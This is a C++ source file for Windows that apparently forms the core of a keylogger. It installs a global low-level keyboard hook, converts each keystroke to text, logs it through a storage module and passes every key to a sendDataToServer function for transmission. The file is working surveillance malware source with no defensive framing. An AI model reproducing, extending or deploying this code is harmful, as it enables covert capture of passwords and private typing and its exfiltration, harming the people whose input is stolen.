#include <iostream>  // Include iostream for cerr
#include <windows.h>
#include <string>
#include <sstream>
#include <chrono>
#include <ctime>
#include "../data_storage/storage.h"  // Corrected include path for storage.h
#include "../data_transmission/transmit.h"  // Include the header file for transmit.h
using namespace std;

// Hook procedure to capture keyboard events
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        // Map virtual key code to character
        std::string key;
        bool isShiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        if (vkCode >= 0x30 && vkCode <= 0x39) {
            key = isShiftPressed ? std::string(1, "!@#$%^&*()"[vkCode - 0x30]) : std::to_string(vkCode - 0x30);
        } else if (vkCode >= 0x41 && vkCode <= 0x5A) { // Letters A-Z
            key = isShiftPressed ? std::string(1, (char)vkCode) : std::string(1, (char)tolower(vkCode));
        } else {
            // Handle special keys
            switch (vkCode) {
                case VK_SPACE: key = " "; break;
                case VK_RETURN: key = "[ENTER]"; break;
                case VK_BACK: key = "[BACKSPACE]"; break;
                case VK_TAB: key = "[TAB]"; break;
                case VK_ESCAPE: key = "[ESC]"; break;
                case VK_CONTROL: key = "[CTRL]"; break;
                case VK_LCONTROL: key = "[LCTRL]"; break;
                case VK_RCONTROL: key = "[RCTRL]"; break;
                case VK_SHIFT: key = "[SHIFT]"; break;
                case VK_LSHIFT: key = "[LSHIFT]"; break;
                case VK_RSHIFT: key = "[RSHIFT]"; break;
                case VK_MENU: key = "[ALT]"; break;
                case VK_LMENU: key = "[LALT]"; break;
                case VK_RMENU: key = "[RALT]"; break;
                default: key = "[0x" + std::to_string(vkCode) + "]"; break;
            }
        }

        // Save the keystroke
        saveKeystroke(key);

        // Optionally send data to server
        sendDataToServer(key);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Main function
int main() {
    // Set the hook
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
    if (!keyboardHook) {
        cerr << "Failed to install hook!" << endl;
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and close the log file
    UnhookWindowsHookEx(keyboardHook);

    return 0;
}